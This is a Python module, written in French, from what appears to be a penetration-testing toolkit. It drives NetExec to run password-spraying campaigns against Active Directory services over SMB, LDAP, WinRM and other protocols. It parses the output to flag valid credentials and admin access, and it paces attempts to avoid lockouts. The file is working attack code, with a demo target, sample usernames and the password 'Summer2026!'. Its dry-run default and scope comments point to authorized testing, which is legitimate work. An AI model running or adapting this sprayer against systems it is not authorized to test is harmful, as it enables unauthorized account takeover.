"""
NetExec Connector - Module 4
==============================

Objectif : brancher le SprayOrchestrator (Module 2/3) et le
LockoutPolicyDiscovery (Module 1) sur des tentatives d'authentification
réelles via NetExec (successeur de CrackMapExec), protocoles SMB/LDAP/WinRM.

NetExec doit être installé et accessible dans le PATH :
    pipx install netexec
    (ou : git clone https://github.com/Pennyw0rth/NetExec)

Ce module pilote netexec en subprocess plutôt que de réimplémenter le
protocole d'auth — netexec gère déjà proprement NTLM/Kerberos/SMB signing.

Usage complet (discovery -> orchestrateur -> spray réel) :

    from lockout_discovery import build_orchestrator_policy_from_ad
    from spray_orchestrator import SprayOrchestrator
    from netexec_connector import NetExecConnector

    kwargs = build_orchestrator_policy_from_ad("10.10.10.10", "DC=corp,DC=local")

    orch = SprayOrchestrator("campaign.db")
    orch.set_policy("CORP-AD", **kwargs, safety_margin=0.8)

    connector = NetExecConnector(target="10.10.10.10", protocol="smb")
    asyncio.run(run_campaign(orch, connector, "CORP-AD", users, password))
"""

import asyncio
import re
import shutil
from dataclasses import dataclass
from typing import Iterable, Optional

from ..display import log_success, log_fail, log_locked, log_lockout_stop


@dataclass
class AuthResult:
    username: str
    success: bool
    admin: bool = False          # pwn3d! / accès admin détecté
    raw_output: str = ""
    locked_out: bool = False     # détection best-effort d'un lockout


class NetExecConnector:
    """Wrapper subprocess autour de netexec pour un seul couple (target, protocol)."""

    SUPPORTED_PROTOCOLS = {"smb", "ldap", "winrm", "rdp", "ssh"}

    def __init__(self, target: str, protocol: str = "smb", domain: Optional[str] = None,
                 extra_args: Optional[list[str]] = None):
        if protocol not in self.SUPPORTED_PROTOCOLS:
            raise ValueError(f"Protocole non supporté : {protocol}")

        if not shutil.which("netexec") and not shutil.which("nxc"):
            raise RuntimeError(
                "netexec introuvable dans le PATH. Installe-le avec : pipx install netexec"
            )

        self.binary = "nxc" if shutil.which("nxc") else "netexec"
        self.target = target
        self.protocol = protocol
        self.domain = domain
        self.extra_args = extra_args or []

    def _build_command(self, username: str, password: str) -> list[str]:
        # SÉCURITÉ : netexec n'accepte le mot de passe que via -p, ce qui le
        # rend visible dans `ps aux`/`/proc/<pid>/cmdline` pour tout
        # utilisateur du même système pendant la durée du subprocess. C'est
        # une limitation de l'interface CLI de netexec, pas de ce wrapper.
        # Lance ce connecteur depuis une VM d'attaque dédiée mono-utilisateur.
        cmd = [self.binary, self.protocol, self.target, "-u", username, "-p", password]
        if self.domain:
            cmd += ["-d", self.domain]
        cmd += self.extra_args
        return cmd

    async def try_login(self, username: str, password: str, timeout: float = 15.0) -> AuthResult:
        cmd = self._build_command(username, password)
        proc = None

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            output = stdout.decode(errors="ignore") + stderr.decode(errors="ignore")
        except asyncio.TimeoutError:
            if proc:
                proc.kill()
                await proc.wait()
            return AuthResult(username=username, success=False, raw_output="[timeout]")
        except OSError as e:
            # binaire disparu entre le check shutil.which() et l'exécution, permissions, etc.
            return AuthResult(username=username, success=False, raw_output=f"[erreur subprocess: {e}]")

        return self._parse_output(username, output)

    def _parse_output(self, username: str, output: str) -> AuthResult:
        """Parse la sortie texte de netexec. Fragile par nature (dépend du
        format d'affichage de l'outil) — à ajuster si le format évolue.
        """
        locked = bool(re.search(r"STATUS_ACCOUNT_LOCKED_OUT|account.*locked", output, re.I))
        success = "[+]" in output and not locked
        admin = "(Pwn3d!)" in output

        return AuthResult(
            username=username,
            success=success,
            admin=admin,
            raw_output=output.strip(),
            locked_out=locked,
        )


# ---------------------------------------------------------------------- #
# Boucle de campagne complète : orchestrateur + connecteur
# ---------------------------------------------------------------------- #

async def run_campaign(orch, connector: NetExecConnector, service: str,
                        usernames: Iterable[str], password: str,
                        dry_run: bool = True, stop_on_lockout_detected: bool = True,
                        audit_log=None, target: str = None, tenant: str = None):
    """Exécute une campagne de spray complète pour un seul mot de passe
    contre une liste d'usernames, en respectant l'orchestrateur.

    dry_run=True par défaut : AUCUNE tentative réelle n'est envoyée tant
    que ce n'est pas explicitement passé à False. C'est le garde-fou
    principal contre un lancement accidentel.

    audit_log : instance optionnelle de AuditLogger (sprayctl.audit_log)
    pour la traçabilité contractuelle — jamais le mot de passe n'y est écrit.
    """
    results = []
    usernames = list(usernames)

    policy = orch.get_policy(service)
    if audit_log:
        audit_log.log_campaign_start(
            service=service, protocol=getattr(connector, "protocol", "o365"),
            target=target, tenant=tenant, total_users=len(usernames),
            threshold=policy.threshold if policy else None,
            window_minutes=policy.window_minutes if policy else None,
            dry_run=dry_run,
        )

    stopped_on_lockout = False

    async for username, delay in orch.next_batch(service, usernames, dry_run=dry_run):
        if dry_run:
            if audit_log:
                audit_log.log_skip(service, username, reason="dry_run")
            # rien de réel n'a été tenté, on ne fait qu'enregistrer un "no-op"
            continue

        result = await connector.try_login(username, password)
        orch.record_attempt(service, username, success=result.success)
        results.append(result)

        if audit_log:
            audit_log.log_attempt(service, username, success=result.success, admin=result.admin)

        if result.success:
            log_success(username, admin=result.admin)
        elif result.locked_out:
            log_locked(username)
        else:
            log_fail(username)

        if result.locked_out and stop_on_lockout_detected:
            log_lockout_stop(username)
            if audit_log:
                audit_log.log_lockout_detected(service, username)
            stopped_on_lockout = True
            break

    if audit_log:
        audit_log.log_campaign_end(
            service=service,
            attempted=len(results),
            successes=sum(1 for r in results if r.success),
            stopped_on_lockout=stopped_on_lockout,
        )

    return results


if __name__ == "__main__":
    # Exemple d'assemblage complet — à adapter au contexte réel de mission
    from ..orchestrator import SprayOrchestrator

    async def demo():
        orch = SprayOrchestrator("demo_full_campaign.db")
        # Valeurs à remplacer par le résultat réel de lockout_discovery.py
        orch.set_policy("CORP-AD", threshold=5, window_minutes=30, safety_margin=0.8)

        connector = NetExecConnector(target="10.10.10.10", protocol="smb", domain="CORP")

        users = ["jdupont", "amartin", "svincent"]
        await run_campaign(
            orch, connector, "CORP-AD", users,
            password="Summer2026!",
            dry_run=True,  # passer à False uniquement après validation du client/scope
        )

    asyncio.run(demo())
